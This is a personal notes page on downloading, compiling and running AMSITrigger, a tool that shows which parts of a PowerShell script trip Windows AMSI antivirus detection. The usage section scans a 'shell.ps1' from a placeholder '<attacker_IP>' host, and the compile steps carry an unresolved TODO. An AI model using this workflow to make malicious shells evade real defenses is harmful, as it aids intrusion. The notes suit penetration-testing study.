# AMSITrigger

## 01 - Setup

### 1.1 - Download Pre-compiled Binary

```
PS C:\Users\userware\Tools\> mkdir AMSITrigger

PS C:\Users\userware\Tools\AMSITrigger> Invoke-WebRequest -Uri https://github.com/RythmStick/AMSITrigger/releases/download/v3/AmsiTrigger_x64.exe -UseBasicParsing -OutFile AMSITrigger.exe
```

### 1.2 - Compile

Install a targeting pack from this [link](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481). We'll be repeating the steps just like we compiled in [[ThreatCheck#^1f5090|ThreatCheck]].

```
PS C:\Users\userware\Tools> git clone https://github.com/RythmStick/AMSITrigger.git
cd AMSITrigger\AMSITrigger\
copy Program.cs Program.cs.bak
dotnet new console --force
del Program.cs; move Program.cs.bak Program.cs
dotnet add package Costura.Fody --version 4.1.0
dotnet add package Fody --version 6.0.0
dotnet add package NDesk.Options --version 0.2.1
dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true -p:TargetFrameworkVersion=v4.8.1 --sc false
```

![[AMSITrigger AssemblyInfo Comment Lines.png]]

TODO: figure it out about the MSBuild errors

```
PS C:\Users\userware\Tools\AMSITrigger\AMSITrigger> dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true --sc false
```

## 02 - Help Menu

```
PS C:\Users\userware\Tools\AMSITrigger> .\AMSITrigger.exe -h
-i, --inputfile=VALUE       Powershell filename
-u, --url=VALUE             URL eg. https://10.1.1.1/Invoke-NinjaCopy.ps1
-f, --format=VALUE          Output Format:
                              1 - Only show Triggers
                              2 - Show Triggers with Line numbers
                              3 - Show Triggers inline with code
                              4 - Show AMSI calls (xmas tree mode)
-d, --debug                 Show Debug Info
-m, --maxsiglength=VALUE    Maximum signature Length to cater for,
                              default=2048
-c, --chunksize=VALUE       Chunk size to send to AMSIScanBuffer,
                              default=4096
-h, -?, --help              Show Help
```

## 03 - Usage

```
PS C:\Users\userware\Tools\AMSITrigger> .\AMSITrigger.exe -i /path/to/shell.ps1 -f 3

PS C:\Users\userware\Tools\AMSITrigger> .\AMSITrigger.exe -u http[s]://<attacker_IP>/shell.ps1 -f 3
```

---
## References

- [AMSITrigger]([https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger))